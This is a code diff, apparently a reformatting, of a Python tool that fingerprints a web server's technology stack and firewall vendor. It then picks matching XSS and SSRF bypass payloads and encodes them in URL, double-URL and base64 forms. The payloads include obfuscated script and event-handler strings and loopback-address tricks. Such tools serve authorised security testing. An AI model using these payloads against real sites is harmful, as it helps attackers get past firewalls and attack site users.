@@ -25,24 +25,25 @@ logger = logging.getLogger(__name__)
 # Stack & WAF enumerations
 # ---------------------------------------------------------------------------
 
+
 class TechStack(str, Enum):
-    PHP        = "php"
-    JAVA       = "java"
-    DOTNET     = "dotnet"
-    NODEJS     = "nodejs"
-    PYTHON     = "python"
-    RUBY       = "ruby"
-    UNKNOWN    = "unknown"
+    PHP = "php"
+    JAVA = "java"
+    DOTNET = "dotnet"
+    NODEJS = "nodejs"
+    PYTHON = "python"
+    RUBY = "ruby"
+    UNKNOWN = "unknown"
 
 
 class WAFType(str, Enum):
     CLOUDFLARE = "cloudflare"
-    MODSECURITY= "modsecurity"
-    AKAMAI     = "akamai"
-    IMPERVA    = "imperva"
-    SUCURI     = "sucuri"
-    NONE       = "none"
-    UNKNOWN    = "unknown"
+    MODSECURITY = "modsecurity"
+    AKAMAI = "akamai"
+    IMPERVA = "imperva"
+    SUCURI = "sucuri"
+    NONE = "none"
+    UNKNOWN = "unknown"
 
 
 # ---------------------------------------------------------------------------
@@ -53,41 +54,41 @@ _STACK_SIGNALS: dict[TechStack, list[tuple[str, str]]] = {
     TechStack.PHP: [
         ("header", "X-Powered-By: PHP"),
         ("header", "Set-Cookie: PHPSESSID"),
-        ("url",    r"\.php($|\?)"),
-        ("body",   "PHP Fatal error"),
-        ("body",   "<?php"),
+        ("url", r"\.php($|\?)"),
+        ("body", "PHP Fatal error"),
+        ("body", "<?php"),
     ],
     TechStack.JAVA: [
         ("header", "X-Powered-By: JSP"),
         ("header", "Set-Cookie: JSESSIONID"),
-        ("url",    r"\.jsp($|\?)"),
-        ("body",   "java.lang."),
-        ("body",   "at org.apache"),
+        ("url", r"\.jsp($|\?)"),
+        ("body", "java.lang."),
+        ("body", "at org.apache"),
     ],
     TechStack.DOTNET: [
         ("header", "X-Powered-By: ASP.NET"),
         ("header", "X-AspNet-Version"),
-        ("url",    r"\.(aspx?|cshtml)($|\?)"),
-        ("body",   "System.Web"),
-        ("body",   "__VIEWSTATE"),
+        ("url", r"\.(aspx?|cshtml)($|\?)"),
+        ("body", "System.Web"),
+        ("body", "__VIEWSTATE"),
     ],
     TechStack.NODEJS: [
         ("header", "X-Powered-By: Express"),
-        ("body",   "Cannot GET"),
-        ("body",   "Error: ENOENT"),
+        ("body", "Cannot GET"),
+        ("body", "Error: ENOENT"),
     ],
     TechStack.PYTHON: [
         ("header", "Server: gunicorn"),
         ("header", "Server: Werkzeug"),
-        ("body",   "Traceback (most recent call last)"),
-        ("body",   "Django"),
-        ("body",   "Flask"),
+        ("body", "Traceback (most recent call last)"),
+        ("body", "Django"),
+        ("body", "Flask"),
     ],
     TechStack.RUBY: [
         ("header", "Server: Puma"),
         ("header", "X-Powered-By: Phusion Passenger"),
-        ("body",   "ActionController"),
-        ("body",   "Ruby on Rails"),
+        ("body", "ActionController"),
+        ("body", "Ruby on Rails"),
     ],
 }
 
@@ -95,26 +96,26 @@ _WAF_SIGNALS: dict[WAFType, list[tuple[str, str]]] = {
     WAFType.CLOUDFLARE: [
         ("header", "Server: cloudflare"),
         ("header", "CF-RAY"),
-        ("body",   "Attention Required! | Cloudflare"),
+        ("body", "Attention Required! | Cloudflare"),
     ],
     WAFType.MODSECURITY: [
         ("header", "Server: ModSecurity"),
-        ("body",   "ModSecurity Action"),
-        ("body",   "Not Acceptable!"),
+        ("body", "ModSecurity Action"),
+        ("body", "Not Acceptable!"),
         ("status", "406"),
         ("status", "501"),
     ],
     WAFType.IMPERVA: [
         ("header", "X-Iinfo"),
-        ("body",   "Incapsula"),
+        ("body", "Incapsula"),
     ],
     WAFType.AKAMAI: [
         ("header", "Server: AkamaiGHost"),
-        ("body",   "Access Denied | Akamai"),
+        ("body", "Access Denied | Akamai"),
     ],
     WAFType.SUCURI: [
         ("header", "X-Sucuri-ID"),
-        ("body",   "Sucuri WebSite Firewall"),
+        ("body", "Sucuri WebSite Firewall"),
     ],
 }
 
@@ -137,11 +138,11 @@ _PAYLOAD_BANK: dict[VulnType, dict] = {
             WAFType.CLOUDFLARE: [
                 "<ScRipT>alert(1)</ScRipT>",
                 "<<SCRIPT>alert(1)//<</SCRIPT>",
-                "<img src=x onerror=\"&#97;lert(1)\">",
+                '<img src=x onerror="&#97;lert(1)">',
                 "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
             ],
             WAFType.MODSECURITY: [
-                "<a href=\"jav&#x09;ascript:alert(1)\">click</a>",
+                '<a href="jav&#x09;ascript:alert(1)">click</a>',
                 "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>",
                 "<input autofocus onfocus=alert(1)>",
                 "<details open ontoggle=alert(1)>",
@@ -179,10 +180,10 @@ _PAYLOAD_BANK: dict[VulnType, dict] = {
         ],
         "waf_bypass": {
             WAFType.CLOUDFLARE: [
-                "http://0x7f000001/",           # 127.0.0.1 in hex
-                "http://2130706433/",           # 127.0.0.1 as decimal
+                "http://0x7f000001/",  # 127.0.0.1 in hex
+                "http://2130706433/",  # 127.0.0.1 as decimal
                 "http://127.1/",
-                "http://①②⑦.⓪.⓪.①/",       # Unicode lookalike
+                "http://①②⑦.⓪.⓪.①/",  # Unicode lookalike
             ],
         },
     },
@@ -226,28 +227,32 @@ _PAYLOAD_BANK: dict[VulnType, dict] = {
 # Fingerprint result
 # ---------------------------------------------------------------------------
 
+
 @dataclass
 class FingerprintResult:
-    stack:        TechStack
-    waf:          WAFType
-    indicators:   list[str] = field(default_factory=list)
-    confidence:   float     = 0.0
+    stack: TechStack
+    waf: WAFType
+    indicators: list[str] = field(default_factory=list)
+    confidence: float = 0.0
 
     def __str__(self) -> str:
-        return f"Stack: {self.stack.value} | WAF: {self.waf.value} | Confidence: {self.confidence:.0%}"
+        return (
+            f"Stack: {self.stack.value} | WAF: {self.waf.value} | Confidence: {self.confidence:.0%}"
+        )
 
 
 # ---------------------------------------------------------------------------
 # Payload result
 # ---------------------------------------------------------------------------
 
+
 @dataclass
 class PayloadResult:
-    vuln_type:  VulnType
-    payloads:   list[str]
-    stack:      TechStack
-    waf:        WAFType
-    encoded:    dict[str, list[str]] = field(default_factory=dict)   # encoding → payloads
+    vuln_type: VulnType
+    payloads: list[str]
+    stack: TechStack
+    waf: WAFType
+    encoded: dict[str, list[str]] = field(default_factory=dict)  # encoding → payloads
 
     def best(self) -> str:
         """Return the first (highest-priority) payload."""
@@ -264,6 +269,7 @@ class PayloadResult:
 # ---------------------------------------------------------------------------
 # Fingerprinter
 # ---------------------------------------------------------------------------
+
 
 class Fingerprinter:
     """
@@ -284,14 +290,14 @@ class Fingerprinter:
         headers = headers or {}
         headers_str = "\n".join(f"{k}: {v}" for k, v in headers.items())
         context = {
-            "url":    url,
+            "url": url,
             "header": headers_str,
-            "body":   body,
+            "body": body,
             "status": status_code,
         }
 
         stack, stack_hits = self._detect(context, _STACK_SIGNALS, TechStack.UNKNOWN)
-        waf, waf_hits     = self._detect(context, _WAF_SIGNALS,   WAFType.UNKNOWN)
+        waf, waf_hits = self._detect(context, _WAF_SIGNALS, WAFType.UNKNOWN)
 
         all_hits = stack_hits + waf_hits
         confidence = min(len(all_hits) * 0.25, 1.0)
@@ -323,6 +329,7 @@ class Fingerprinter:
 # ---------------------------------------------------------------------------
 # Payload builder
 # ---------------------------------------------------------------------------
+
 
 class PayloadBuilder:
     """
@@ -384,7 +391,7 @@ class PayloadBuilder:
 
         encoded: dict[str, list[str]] = {}
         if include_encodings and payloads:
-            encoded = self._generate_encodings(payloads[:3])   # encode top 3 only
+            encoded = self._generate_encodings(payloads[:3])  # encode top 3 only
 
         return PayloadResult(
             vuln_type=vuln_type,
@@ -437,7 +444,9 @@ class PayloadBuilder:
 
     def _generate_encodings(self, payloads: list[str]) -> dict[str, list[str]]:
         return {
-            "url":     [urllib.parse.quote(p, safe="") for p in payloads],
-            "double_url": [urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="") for p in payloads],
-            "base64":  [base64.b64encode(p.encode()).decode() for p in payloads],
+            "url": [urllib.parse.quote(p, safe="") for p in payloads],
+            "double_url": [
+                urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="") for p in payloads
+            ],
+            "base64": [base64.b64encode(p.encode()).decode() for p in payloads],
         }
